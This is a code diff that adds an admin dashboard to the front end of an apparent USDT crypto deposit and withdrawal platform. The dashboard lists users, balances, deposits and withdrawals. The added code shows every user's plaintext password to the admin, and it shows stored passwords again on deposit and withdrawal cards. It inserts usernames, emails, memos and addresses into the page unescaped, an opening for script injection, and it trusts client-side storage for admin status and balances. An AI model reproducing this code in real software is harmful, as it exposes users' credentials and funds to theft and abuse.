@@ -1373,6 +1373,106 @@ el.className='toast t-'+(type==='ok'?'ok':type==='err'?'err':'info')+' on';
 setTimeout(function(){el.classList.remove('on')},3500);
 }
 
+/* ADMIN FIX v2 - Index-based rendering, no escaping issues */
+var _AUall=[],_AUdisp=[],_ADdisp=[],_AWdisp=[];
+
+function renderAdmin(){
+if(!isAdmin)return;
+_AUall=LS('bsc20_users')||[];
+var allD=LS('bsc20_deps')||[];
+var allW=LS('bsc20_wds')||[];
+var uc=LS('bsc20_used_c')||{};
+_ADdisp=allD.slice().reverse();
+_AWdisp=allW.slice().reverse();
+document.getElementById('aU').textContent=_AUall.length;
+document.getElementById('aD').textContent=allD.length;
+document.getElementById('aW').textContent=allW.length;
+document.getElementById('aC').textContent=Object.keys(uc).length;
+renderAUsers();renderADeps();renderAWds();
+}
+
+function renderAUsers(filter){
+var ws=LS('bsc20_wallets')||{};
+if(filter&&typeof filter==='string'&&filter.length>0){
+var s=filter.toLowerCase();_AUdisp=[];
+for(var i=0;i<_AUall.length;i++){var u=_AUall[i];
+if(u.username.toLowerCase().indexOf(s)>=0||u.email.toLowerCase().indexOf(s)>=0||u.id.indexOf(s)>=0)_AUdisp.push(u);}
+}else{_AUdisp=_AUall.slice();}
+var el=document.getElementById('adUserList');
+if(!_AUdisp.length){el.innerHTML='<div class="tc ts" style="padding:20px;color:var(--gray)">No users found</div>';return;}
+var h='';
+for(var i=0;i<_AUdisp.length;i++){
+var u=_AUdisp[i];var w=ws[u.id]||{main:0,bonus:0};var tt=(w.main+w.bonus).toFixed(2);var bn=u.banned?true:false;
+h+='<div class="user-card'+(bn?' user-banned':'')+'">';
+h+='<div class="flex-b mb4"><div>';
+if(bn){h+='<div style="font-weight:700;font-size:13px;color:var(--red)">🚫 '+u.username+'</div>';}
+else{h+='<div style="font-weight:700;font-size:13px;color:var(--gold)"><span class="user-online"></span>'+u.username+'</div>';}
+h+='<div class="txs" style="color:var(--gray)">'+u.email+'</div>';
+h+='</div><div style="font-family:JetBrains Mono,monospace;font-weight:900;font-size:16px;color:var(--gold)">$'+tt+'</div></div>';
+h+='<div class="txs" style="color:var(--gray2)">Main: $'+w.main.toFixed(2)+' | Bonus: $'+w.bonus.toFixed(2)+'</div>';
+h+='<div class="txs" style="color:var(--gray2)">ID: '+u.id+'</div>';
+h+='<div class="txs" style="color:var(--gray2)">Pass: '+u.password+'</div>';
+h+='<div class="txs" style="color:var(--gray2)">Joined: '+new Date(u.created).toLocaleDateString()+'</div>';
+if(u.kyc)h+='<div class="txs" style="color:var(--green)">KYC: Verified ✅</div>';
+if(u.gmail)h+='<div class="txs" style="color:var(--blue)">Gmail: '+u.gmail+'</div>';
+if(bn)h+='<div class="txs fw7" style="color:var(--red)">⛔ BANNED</div>';
+h+='<div class="uc-actions">';
+h+='<button class="btn btn-gold btn-xs" onclick="aAct(0,'+i+')">💰 Edit</button>';
+h+='<button class="btn '+(bn?'btn-green':'btn-red')+' btn-xs" onclick="aAct(1,'+i+')">'+(bn?'Unban':'Ban')+'</button>';
+h+='<button class="btn btn-outline btn-xs" onclick="aAct(2,'+i+')">+Bonus</button>';
+h+='<button class="btn btn-outline btn-xs" onclick="aAct(3,'+i+')">Reset</button>';
+h+='</div></div>';
+}
+el.innerHTML=h;
+}
+
+function searchAU(v){renderAUsers(v);}
+
+function aAct(t,i){var u=_AUdisp[i];if(!u)return;if(t===0)openEM(u.id);if(t===1)toggleBanD(u.id);if(t===2)addBonusD(u.id);if(t===3)resetBalD(u.id);}
+
+function renderADeps(){
+var el=document.getElementById('adDepList');
+if(!_ADdisp.length){el.innerHTML='<div class="tc ts" style="padding:20px;color:var(--gray)">No deposits yet</div>';return;}
+var h='';
+for(var i=0;i<_ADdisp.length;i++){
+var d=_ADdisp[i];var sc=d.st==='completed'?'st-d':d.st==='rejected'?'st-f':'st-p';
+h+='<div class="card mb8">';
+h+='<div class="flex-b mb4"><div><span class="fw7 ts" style="color:var(--gold)">'+d.uname+'</span> <span class="txs" style="color:var(--gray)">'+d.uemail+'</span></div><span class="'+sc+'">'+d.st+'</span></div>';
+h+='<div class="flex-b txs mb4"><span class="mono fw7" style="color:var(--gold)">'+d.amt+' USDT ('+d.net+')</span><span style="color:var(--gray)">'+new Date(d.at).toLocaleString()+'</span></div>';
+if(d.memo)h+='<div class="txs mono mb4" style="color:var(--gold);font-weight:700">Memo: '+d.memo+'</div>';
+h+='<div class="txs mb4" style="color:var(--gray)">UserID: '+d.uid+'</div>';
+h+='<div class="txs mb4" style="color:var(--gray)">Pass: '+(d.upass||'-')+'</div>';
+if(d.st==='pending'){h+='<div class="g2"><button class="btn btn-green btn-sm" onclick="dAct(0,'+i+')">✅ Approve +$'+d.amt+'</button><button class="btn btn-red btn-sm" onclick="dAct(1,'+i+')">❌ Reject</button></div>';}
+h+='</div>';
+}
+el.innerHTML=h;
+}
+
+function dAct(t,i){var d=_ADdisp[i];if(!d)return;if(t===0)appDep(d.id);if(t===1)rejDep(d.id);}
+
+function renderAWds(){
+var el=document.getElementById('adWdList');
+if(!_AWdisp.length){el.innerHTML='<div class="tc ts" style="padding:20px;color:var(--gray)">No withdrawals yet</div>';return;}
+var h='';
+for(var i=0;i<_AWdisp.length;i++){
+var w=_AWdisp[i];var sc=w.st==='completed'?'st-d':w.st==='refunded'?'st-f':'st-p';
+h+='<div class="card mb8">';
+h+='<div class="flex-b mb4"><div><span class="fw7 ts" style="color:var(--gold)">'+w.uname+'</span> <span class="txs" style="color:var(--gray)">'+w.uemail+'</span></div><span class="'+sc+'">'+w.st+'</span></div>';
+h+='<div class="flex-b txs mb4"><span class="mono fw7" style="color:var(--gold)">'+w.amt+' USDT</span><span style="color:var(--gray)">'+w.method+'</span></div>';
+h+='<div class="txs mono mb4" style="word-break:break-all;color:var(--gray)">To: '+w.addr+'</div>';
+h+='<div class="txs mb4" style="color:var(--gray)">'+new Date(w.at).toLocaleString()+' | Fee: '+w.fee+' USDT</div>';
+h+='<div class="txs mb4" style="color:var(--gray)">UserID: '+w.uid+' | Pass: '+(w.upass||'-')+'</div>';
+if(w.st==='pending'){h+='<div class="g2"><button class="btn btn-green btn-sm" onclick="wAct(0,'+i+')">✅ Complete</button><button class="btn btn-red btn-sm" onclick="wAct(1,'+i+')">🔄 Refund</button></div>';}
+h+='</div>';
+}
+el.innerHTML=h;
+}
+
+function wAct(t,i){var w=_AWdisp[i];if(!w)return;if(t===0)compWd(w.id);if(t===1)refWd(w.id);}
+
+/* Admin auto-refresh every 5 seconds */
+setInterval(function(){if(isAdmin){var pg=document.querySelector('.page.active');if(pg&&pg.id==='pg_admin')renderAdmin();}},5000);
+
 document.addEventListener('DOMContentLoaded',init);
 </script>
 </body>
